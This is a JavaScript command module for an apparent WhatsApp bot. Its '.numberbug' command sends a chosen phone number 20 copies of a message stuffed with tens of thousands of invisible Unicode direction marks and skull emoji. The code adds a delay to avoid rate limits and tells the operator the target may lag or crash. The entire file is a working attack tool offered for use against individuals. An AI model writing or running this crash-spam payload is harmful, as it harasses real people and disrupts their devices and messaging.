module.exports = async function(sock, from, msg, isOwner, q) {
    if (!isOwner) return await sock.sendMessage(from, { text: '❌ Owner only!' }, { quoted: msg });
    
    try {
        let target;
        const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        const quoted = msg.message?.extendedTextMessage?.contextInfo?.participant;
        
        if (q) target = q.replace(/\D/g, '') + '@s.whatsapp.net';
        else if (mentioned) target = mentioned;
        else if (quoted) target = quoted;
        else return await sock.sendMessage(from, { text: '⚠️ Please mention or provide a target number!\nExample: .numberbug @user or .numberbug 923xxxxxxxxx' }, { quoted: msg });

        if (!target.endsWith('@s.whatsapp.net')) {
            return await sock.sendMessage(from, { text: '❌ Invalid target format. Must be a WhatsApp number.' }, { quoted: msg });
        }

        await sock.sendMessage(from, { text: `💥 *Initiating Number Bug...*\nTarget: @${target.split('@')[0]}\nPayload: Heavy Text Spam` }, { quoted: msg, mentions: [target] });

        const bugPayload = "\u200E\u200F\u200E\u200F\u200E\u200F\u200E\u200F".repeat(5000) + "\uD83D\uDC80".repeat(1000);

        for (let i = 0; i < 20; i++) {
            try {
                await sock.sendMessage(target, { text: bugPayload });
                await new Promise(resolve => setTimeout(resolve, 200)); // Small delay to prevent rate limiting
            } catch (e) {
                console.error(`Error sending bug payload to ${target}: ${e.message}`);
            }
        }

        await sock.sendMessage(from, { text: '✅ *Number Bug sequence completed!*\n_Target may experience lag or crash._' }, { quoted: msg });
    } catch (e) {
        await sock.sendMessage(from, { text: '❌ Error: ' + e.message }, { quoted: msg });
    }
};
